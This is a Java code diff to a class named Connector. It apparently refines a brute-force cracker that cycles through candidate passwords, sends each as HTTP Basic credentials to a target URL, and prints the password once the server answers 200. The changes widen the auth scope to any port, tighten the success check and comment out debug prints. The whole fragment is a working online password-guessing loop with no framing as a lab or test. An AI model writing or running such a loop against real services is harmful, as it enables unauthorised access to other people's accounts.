@@ -21,25 +21,27 @@ public class Connector {
 
         for(String password = passwordSupplier.get() ; password.length() <= maxPassLen ; password = passwordSupplier.get()) {
             httpClient.getCredentialsProvider().setCredentials(
-                    new AuthScope(host, port),
+                    new AuthScope(host, AuthScope.ANY_PORT),
                     new UsernamePasswordCredentials(username, password)
             );
 
             HttpGet httpGet = new HttpGet(fullURL);
             HttpResponse response = httpClient.execute(httpGet);
             HttpEntity entity = response.getEntity();
+//            System.out.println(httpClient.);
 
-            if(response.getStatusLine().getStatusCode() != 401) {
+            if(response.getStatusLine().getStatusCode() == 200) {
                 System.out.println("Password found!");
                 System.out.println("Pass: " + password);
                 break;
+            } else {
+//                System.out.println(password + " " + response.getStatusLine().getStatusCode());
             }
 
             entity.consumeContent();
         }
 
-        System.out.println("Password not found((");
-
+        System.out.println("DONE");
         // When HttpClient instance is no longer needed,
         // shut down the connection manager to ensure
         // immediate deallocation of all system resources
